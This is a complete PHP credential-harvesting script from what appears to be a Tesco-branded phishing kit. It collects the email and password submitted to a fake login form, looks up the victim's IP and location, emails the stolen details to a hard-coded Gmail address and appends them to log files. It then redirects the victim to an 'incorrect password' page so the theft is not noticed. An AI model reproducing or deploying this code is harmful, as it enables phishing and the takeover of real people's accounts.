<?php

$email = $_POST["email"];
$pass = $_POST["pass"];

if($_POST["email"] != "" and $_POST["pass"] != ""){
require_once('geoplugin.class.php');

$geoplugin = new geoPlugin();
$geoplugin->locate();
if (!empty($_SERVER['HTTP_CLIENT_IP'])) { 
    $ip = $_SERVER['HTTP_CLIENT_IP']; 
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { 
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; 
} else { 
    $ip = $_SERVER['REMOTE_ADDR']; 
} 
$adddate=date("D M d, Y g:i a");
$message .= "--------------0nline Inf0-----------------------\n";
$message .= "Email            : ".$_POST['email']."\n";
$message .= "Password           : ".$_POST['pass']."\n";
$message .= "---------=IP Address & Date=---------\n";
$message .= "IP Address: ".$ip."\n";
$message .= "City: {$geoplugin->city}\n";
$message .= "Region: {$geoplugin->region}\n";
$message .= "Country Name: {$geoplugin->countryName}\n";
$message .= "Country Code: {$geoplugin->countryCode}\n";
$message .= "Date: ".$adddate."\n";
$message .= "---------------Unknown-------------\n";

$data = "
+ ------------- Tesco LOG -------------+
| Email Add  : $email
| Email Pass : $pass
 $ip
";

//change ur email here
$send = "realmaniac6@gmail.com";
$subject = "$geoplugin->countryName .$ip.";
$headers = "From: 0ffice<customer-support@Spammers>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message,$headers);

$file=fopen("./logs/$ip.txt","a");
$file1=fopen("./logs2/$ip.txt","a");
fwrite($file,$data."\r\n");
fwrite($file1,$data."\r\n");
fclose($file);
fclose($file1);

}
$praga=rand();
$praga=md5($praga);
     header("Location: incorrect.php?user=".$_POST['email']);
}else{
header("Location: index.php");
}

?>
